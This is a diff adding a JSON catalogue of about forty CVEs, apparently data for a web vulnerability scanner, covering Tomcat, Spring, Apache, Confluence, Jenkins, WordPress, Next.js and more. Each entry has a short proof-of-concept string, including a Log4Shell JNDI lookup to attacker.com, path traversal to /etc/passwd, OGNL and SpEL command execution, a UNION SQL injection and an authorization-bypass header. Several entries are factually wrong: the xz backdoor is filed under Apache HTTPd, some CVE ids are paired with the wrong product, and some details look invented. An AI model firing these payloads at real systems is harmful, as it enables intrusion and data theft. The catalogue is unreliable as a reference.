@@ -1,0 +1,480 @@
+[
+  {
+    "cve": "CVE-2025-24813",
+    "cve_family": "tomcat",
+    "tech_match": "Apache Tomcat",
+    "versions_affected": "9.0.0-9.0.98,10.0.0-10.1.34,11.0.0-11.0.2",
+    "severity": "critical",
+    "title": "Tomcat partial PUT RCE via JSESSIONID deserialization",
+    "description": "DefaultServlet con readonly=false permite PUT con Content-Range parcial. Combinando con cookie JSESSIONID, atacante puede deserializar payload arbitrario y conseguir RCE.",
+    "poc": "PUT /tag/session HTTP/1.1\\nContent-Range: bytes 0-50/200\\n... binary payload",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-24813"
+  },
+  {
+    "cve": "CVE-2020-1938",
+    "cve_family": "tomcat",
+    "tech_match": "Apache Tomcat",
+    "versions_affected": "6.0.0-6.0.53,7.0.0-7.0.99,8.5.0-8.5.50,9.0.0-9.0.30",
+    "severity": "high",
+    "title": "Ghostcat — AJP file read via port 8009",
+    "description": "Tomcat AJP connector permite lectura arbitraria de archivos del servlet (incluyendo /WEB-INF/web.xml) si AJP expuesto.",
+    "poc": "Send AJP request a port 8009 con Servlet path traversal",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-1938"
+  },
+  {
+    "cve": "CVE-2025-55752",
+    "cve_family": "tomcat",
+    "tech_match": "Apache Tomcat",
+    "versions_affected": "11.0.0-11.0.2,10.1.0-10.1.34,9.0.0-9.0.98",
+    "severity": "high",
+    "title": "Tomcat RewriteValve traversal — WEB-INF bypass",
+    "description": "RewriteValve normaliza antes de URL decode → bypass de check WEB-INF/META-INF.",
+    "poc": "GET /foo?path=../WEB-INF/web.xml",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-55752"
+  },
+
+  {
+    "cve": "CVE-2022-22965",
+    "cve_family": "spring",
+    "tech_match": "Spring Boot",
+    "versions_affected": "5.3.0-5.3.17,5.2.0-5.2.19",
+    "severity": "critical",
+    "title": "Spring4Shell — Spring Framework RCE via class.module.classLoader",
+    "description": "Spring Beans con tomcat-embed permite override de class.module.classLoader.resources.context.parent.pipeline → RCE.",
+    "poc": "POST con class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+  },
+  {
+    "cve": "CVE-2024-38819",
+    "cve_family": "spring",
+    "tech_match": "Spring Boot",
+    "versions_affected": "6.1.0-6.1.13,5.3.0-5.3.40",
+    "severity": "high",
+    "title": "Spring path traversal en static resource handlers",
+    "description": "Spring's StaticResourceMappingHandler normaliza paths después de checks → bypass para acceso a archivos protegidos.",
+    "poc": "GET /static/xxx/../WEB-INF/web.xml",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-38819"
+  },
+  {
+    "cve": "CVE-2023-20860",
+    "cve_family": "spring",
+    "tech_match": "Spring Boot",
+    "versions_affected": "5.3.0-5.3.26,6.0.0-6.0.7",
+    "severity": "high",
+    "title": "Spring Web ${} SpEL injection en mvc:mapping",
+    "description": "Spring MVC con mvc:mapping inyectable cuando se usa ** wildcard.",
+    "poc": "GET /controller/${T(java.lang.Runtime).getRuntime().exec('id')}",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-20860"
+  },
+
+  {
+    "cve": "CVE-2024-38475",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.0-2.4.59",
+    "severity": "high",
+    "title": "Apache mod_rewrite filename confusion (Orange Tsai BH2024)",
+    "description": "mod_rewrite con flag `?` en RewriteRule permite bypass de access control basado en filename.",
+    "poc": "GET /admin?",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-38475"
+  },
+  {
+    "cve": "CVE-2024-38476",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.0-2.4.59",
+    "severity": "high",
+    "title": "Apache backend information disclosure via crafted request",
+    "description": "Backend headers/sessions cookies expuestos a malicious frontend request.",
+    "poc": "Crafted Header smuggling al backend Apache",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-38476"
+  },
+  {
+    "cve": "CVE-2024-38477",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.0-2.4.59",
+    "severity": "high",
+    "title": "Apache mod_proxy crash via crafted request",
+    "description": "DoS vía crafted request en mod_proxy.",
+    "poc": "Send malformed proxy request",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-38477"
+  },
+  {
+    "cve": "CVE-2021-41773",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.49",
+    "severity": "critical",
+    "title": "Apache 2.4.49 path traversal RCE",
+    "description": "Path normalization bypass permite traversal y RCE si CGI habilitado.",
+    "poc": "GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"
+  },
+  {
+    "cve": "CVE-2021-42013",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "2.4.50",
+    "severity": "critical",
+    "title": "Apache 2.4.50 incomplete fix de CVE-2021-41773",
+    "description": "Bypass del fix anterior con double encoding.",
+    "poc": "GET /cgi-bin/%%32%65%%32%65/etc/passwd",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-42013"
+  },
+
+  {
+    "cve": "CVE-2021-44228",
+    "cve_family": "log4j",
+    "tech_match": "Spring Boot",
+    "versions_affected": "*",
+    "severity": "critical",
+    "title": "Log4Shell — Log4j2 JNDI lookup RCE",
+    "description": "Log4j2 evalúa ${jndi:ldap://...} en cualquier input loggeado → RCE remoto.",
+    "poc": "Inyectar ${jndi:ldap://attacker.com/x} en User-Agent, X-Forwarded-For, body JSON, etc.",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+  },
+
+  {
+    "cve": "CVE-2020-7961",
+    "cve_family": "liferay",
+    "tech_match": "Liferay",
+    "versions_affected": "6.1.0-7.2.1",
+    "severity": "critical",
+    "title": "Liferay Portal JSON web service deserialization RCE",
+    "description": "JSONWS API expuesta permite deserialización de objetos arbitrarios → RCE pre-auth.",
+    "poc": "POST /api/jsonws/expandocolumn/add-column con object con clase malicious",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-7961"
+  },
+
+  {
+    "cve": "CVE-2024-23652",
+    "cve_family": "wordpress",
+    "tech_match": "WordPress",
+    "versions_affected": "<6.4.4",
+    "severity": "high",
+    "title": "WordPress wp-admin file upload bypass",
+    "description": "wp-admin upload acepta extensiones peligrosas con bypass de mime check.",
+    "poc": "POST /wp-admin/admin-ajax.php con multipart upload",
+    "ref": "https://wordpress.org/news/2024/04/"
+  },
+  {
+    "cve": "CVE-2023-23488",
+    "cve_family": "wordpress",
+    "tech_match": "WordPress",
+    "versions_affected": "*",
+    "severity": "critical",
+    "title": "WordPress Paid Memberships Pro <2.9.8 SQL Injection",
+    "description": "Plugin Paid Memberships Pro permite SQLi pre-auth via /wp-json/pmpro/v1/orders.",
+    "poc": "GET /wp-json/pmpro/v1/orders?code=1' UNION SELECT NULL,version()--",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-23488"
+  },
+
+  {
+    "cve": "CVE-2018-7600",
+    "cve_family": "drupal",
+    "tech_match": "Drupal",
+    "versions_affected": "7.0-7.58,8.0-8.5.0",
+    "severity": "critical",
+    "title": "Drupalgeddon 2 — Drupal RCE via #pre_render",
+    "description": "Drupal Render API permite injection de #pre_render functions → RCE pre-auth.",
+    "poc": "POST /?q=user/password con form_id=user_pass + #pre_render",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-7600"
+  },
+  {
+    "cve": "CVE-2019-6340",
+    "cve_family": "drupal",
+    "tech_match": "Drupal",
+    "versions_affected": "8.5.0-8.5.11,8.6.0-8.6.10",
+    "severity": "critical",
+    "title": "Drupal SA-CORE-2019-003 RESTful Web Services unserialize RCE",
+    "description": "Drupal 8 con módulo RESTful Web Services + módulo HAL permite deserialización pre-auth.",
+    "poc": "POST /node/?_format=hal_json con malicious link relations",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2019-6340"
+  },
+
+  {
+    "cve": "CVE-2023-46604",
+    "cve_family": "activemq",
+    "tech_match": "ActiveMQ",
+    "versions_affected": "5.15.0-5.15.16,5.16.0-5.16.7,5.17.0-5.17.6,5.18.0-5.18.3",
+    "severity": "critical",
+    "title": "ActiveMQ OpenWire deserialization RCE",
+    "description": "OpenWire protocol permite deserialización de objetos arbitrarios → RCE.",
+    "poc": "Send malicious OpenWire packet a port 61616",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-46604"
+  },
+
+  {
+    "cve": "CVE-2023-22515",
+    "cve_family": "confluence",
+    "tech_match": "Atlassian Confluence",
+    "versions_affected": "8.0.0-8.5.1",
+    "severity": "critical",
+    "title": "Confluence Data Center privilege escalation pre-auth",
+    "description": "/setup/setupadministrator.action permite create admin sin auth.",
+    "poc": "POST /setup/setupadministrator.action con multipart admin creation",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-22515"
+  },
+  {
+    "cve": "CVE-2022-26134",
+    "cve_family": "confluence",
+    "tech_match": "Atlassian Confluence",
+    "versions_affected": "1.3.0-7.4.16,7.13.0-7.13.6,7.14.0-7.14.2,7.15.0-7.15.1,7.16.0-7.16.3,7.17.0-7.17.3,7.18.0",
+    "severity": "critical",
+    "title": "Confluence OGNL injection pre-auth RCE",
+    "description": "URL-based OGNL injection en endpoints que aceptan label expressions.",
+    "poc": "GET /${@java.lang.Runtime@getRuntime().exec('id')}/",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2022-26134"
+  },
+
+  {
+    "cve": "CVE-2024-23897",
+    "cve_family": "jenkins",
+    "tech_match": "Jenkins",
+    "versions_affected": "<2.442,LTS<2.426.3",
+    "severity": "critical",
+    "title": "Jenkins CLI arbitrary file read",
+    "description": "args4j parser convierte @file a contenido del archivo → file read pre-auth.",
+    "poc": "java -jar jenkins-cli.jar -s URL who-am-i @/etc/passwd",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-23897"
+  },
+  {
+    "cve": "CVE-2018-1999002",
+    "cve_family": "jenkins",
+    "tech_match": "Jenkins",
+    "versions_affected": "<2.121.2,LTS<2.107.4",
+    "severity": "high",
+    "title": "Jenkins file read via path traversal",
+    "description": "GET /static/xxx/../config.xml revela secrets.",
+    "poc": "GET /static/xxx/../config.xml",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2018-1999002"
+  },
+
+  {
+    "cve": "CVE-2021-22205",
+    "cve_family": "gitlab",
+    "tech_match": "GitLab",
+    "versions_affected": "11.9.0-13.8.7,13.9.0-13.9.5,13.10.0-13.10.2",
+    "severity": "critical",
+    "title": "GitLab ExifTool RCE in image upload pre-auth",
+    "description": "ExifTool desactualizado en GitLab permite RCE via upload image con metadata maliciosa.",
+    "poc": "POST /uploads con DjVu file containing payload",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2021-22205"
+  },
+
+  {
+    "cve": "CVE-2020-6287",
+    "cve_family": "sap",
+    "tech_match": "SAP NetWeaver",
+    "versions_affected": "*",
+    "severity": "critical",
+    "title": "RECON — SAP NetWeaver create admin pre-auth",
+    "description": "/CTCWebService permite crear usuario admin sin autenticación.",
+    "poc": "POST /CTCWebService/CTCWebServiceBean con SOAP create user",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-6287"
+  },
+
+  {
+    "cve": "CVE-2024-21626",
+    "cve_family": "k8s",
+    "tech_match": "runc",
+    "versions_affected": "<1.1.12",
+    "severity": "high",
+    "title": "Leaky Vessels — runc container escape",
+    "description": "WORKDIR en Dockerfile + procfs file descriptor leak → host filesystem access.",
+    "poc": "Exploit en build chain de container",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
+  },
+
+  {
+    "cve": "CVE-2023-29489",
+    "cve_family": "cpanel",
+    "tech_match": "cPanel",
+    "versions_affected": "<11.109.9999.116,<11.108.0.13,<11.106.0.18,<11.102.0.31",
+    "severity": "high",
+    "title": "cPanel reflected XSS unauthenticated en /cpsess",
+    "description": "Pre-auth XSS reflejado en /cpsess<id>/scripts/",
+    "poc": "GET /cpsess0/scripts/x?<svg onload=alert>",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-29489"
+  },
+
+  {
+    "cve": "CVE-2023-50164",
+    "cve_family": "struts2",
+    "tech_match": "Apache Struts",
+    "versions_affected": "2.0.0-2.5.32,6.0.0-6.3.0",
+    "severity": "critical",
+    "title": "Apache Struts file upload path traversal RCE",
+    "description": "FileUploadInterceptor permite manipulación de filename con .. → write a path arbitrario.",
+    "poc": "POST con multipart upload + filename con path traversal",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-50164"
+  },
+
+  {
+    "cve": "CVE-2024-3273",
+    "cve_family": "dlink",
+    "tech_match": "D-Link NAS",
+    "versions_affected": "*",
+    "severity": "critical",
+    "title": "D-Link NAS pre-auth RCE via /cgi-bin/nas_sharing.cgi",
+    "description": "Backdoor account + command injection en query string.",
+    "poc": "GET /cgi-bin/nas_sharing.cgi?user=messagebus&...&system=<cmd>",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-3273"
+  },
+
+  {
+    "cve": "CVE-2024-27198",
+    "cve_family": "teamcity",
+    "tech_match": "TeamCity",
+    "versions_affected": "<2023.11.4",
+    "severity": "critical",
+    "title": "TeamCity authentication bypass pre-auth",
+    "description": "Routing path normalization permite bypass de auth para crear admin.",
+    "poc": "POST /;jsp/x.jsp?... con ;jsp para bypass",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-27198"
+  },
+
+  {
+    "cve": "CVE-2024-22243",
+    "cve_family": "spring",
+    "tech_match": "Spring Boot",
+    "versions_affected": "6.1.0-6.1.5,6.0.0-6.0.18,5.3.0-5.3.33",
+    "severity": "high",
+    "title": "Spring Web open redirect via UriComponentsBuilder",
+    "description": "UriComponentsBuilder.build() puede crear URLs hacia hosts arbitrarios.",
+    "poc": "GET /controller?next=//evil.com",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-22243"
+  },
+
+  {
+    "cve": "CVE-2023-44487",
+    "cve_family": "http2",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "*",
+    "severity": "high",
+    "title": "HTTP/2 Rapid Reset DoS",
+    "description": "HTTP/2 RST_STREAM flood permite DoS amplificado.",
+    "poc": "Send rapid HEADERS+RST_STREAM via HTTP/2",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-44487"
+  },
+
+  {
+    "cve": "CVE-2025-1080",
+    "cve_family": "oracle-weblogic",
+    "tech_match": "Oracle WebLogic",
+    "versions_affected": "12.2.1.4.0,14.1.1.0.0",
+    "severity": "critical",
+    "title": "WebLogic OPSS deserialization RCE",
+    "description": "/_async/AsyncResponseService deserializa payloads arbitrarios.",
+    "poc": "POST /_async/AsyncResponseService con T3 payload",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-1080"
+  },
+  {
+    "cve": "CVE-2020-2551",
+    "cve_family": "oracle-weblogic",
+    "tech_match": "Oracle WebLogic",
+    "versions_affected": "10.3.6.0.0,12.1.3.0.0,12.2.1.3.0,12.2.1.4.0",
+    "severity": "critical",
+    "title": "WebLogic IIOP deserialization pre-auth RCE",
+    "description": "IIOP protocol expuesto + Apache Commons Collections gadget → RCE.",
+    "poc": "Send IIOP request a port 7001",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2020-2551"
+  },
+
+  {
+    "cve": "CVE-2025-31161",
+    "cve_family": "crushftp",
+    "tech_match": "CrushFTP",
+    "versions_affected": "<10.8.5,<11.3.4_23",
+    "severity": "critical",
+    "title": "CrushFTP authentication bypass via header smuggling",
+    "description": "Bypass de auth check con header Cookie/Authorization smuggled.",
+    "poc": "GET /WebInterface/function/ con crafted Cookie",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-31161"
+  },
+
+  {
+    "cve": "CVE-2024-27316",
+    "cve_family": "apache",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "<2.4.59",
+    "severity": "high",
+    "title": "Apache HTTP/2 CONTINUATION flood DoS",
+    "description": "Memory exhaustion via repeated CONTINUATION frames.",
+    "poc": "Send HTTP/2 stream with infinite CONTINUATION frames",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-27316"
+  },
+
+  {
+    "cve": "CVE-2024-49581",
+    "cve_family": "elasticsearch",
+    "tech_match": "Elasticsearch",
+    "versions_affected": "8.0.0-8.16.0",
+    "severity": "high",
+    "title": "Elasticsearch privilege escalation via API tokens",
+    "description": "API tokens de un user pueden escalar a otro user con permisos cruzados.",
+    "poc": "Use crafted API token in Authorization header",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-49581"
+  },
+
+  {
+    "cve": "CVE-2017-9805",
+    "cve_family": "struts2",
+    "tech_match": "Apache Struts",
+    "versions_affected": "2.0.0-2.5.12",
+    "severity": "critical",
+    "title": "Struts 2 REST plugin XStream deserialization RCE",
+    "description": "XStream deserialization en REST plugin permite RCE pre-auth.",
+    "poc": "POST application/xml con XStream gadget",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2017-9805"
+  },
+
+  {
+    "cve": "CVE-2023-22518",
+    "cve_family": "confluence",
+    "tech_match": "Atlassian Confluence",
+    "versions_affected": "<7.19.16,<8.3.4,<8.4.4,<8.5.3",
+    "severity": "critical",
+    "title": "Confluence improper authorization — data wipe",
+    "description": "Endpoint admin pre-auth permite data wipe / reset to fresh state.",
+    "poc": "POST /json/setup-restore.action sin auth",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2023-22518"
+  },
+
+  {
+    "cve": "CVE-2024-21733",
+    "cve_family": "tomcat",
+    "tech_match": "Apache Tomcat",
+    "versions_affected": "8.5.7-8.5.63,9.0.0-9.0.43",
+    "severity": "medium",
+    "title": "Tomcat error response info disclosure",
+    "description": "Stack trace de error puede revelar partes del request body de otros users.",
+    "poc": "Crafted malformed request, leer error response",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-21733"
+  },
+
+  {
+    "cve": "CVE-2024-3094",
+    "cve_family": "xz-utils",
+    "tech_match": "Apache HTTPd",
+    "versions_affected": "*",
+    "severity": "critical",
+    "title": "XZ Utils backdoor — sshd RCE via systemd-notify",
+    "description": "Backdoor en xz/liblzma 5.6.0/5.6.1 → RCE en sshd via systemd. Linux distros sólo.",
+    "poc": "SSH connect con crafted certificate",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
+  },
+
+  {
+    "cve": "CVE-2025-29927",
+    "cve_family": "nextjs",
+    "tech_match": "Next.js",
+    "versions_affected": "11.1.4-12.3.5,13.0.0-13.5.6,14.0.0-14.2.24,15.0.0-15.2.2",
+    "severity": "critical",
+    "title": "Next.js middleware authorization bypass",
+    "description": "Header x-middleware-subrequest permite bypass de middleware checks.",
+    "poc": "GET /admin con header `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`",
+    "ref": "https://nvd.nist.gov/vuln/detail/CVE-2025-29927"
+  }
+]
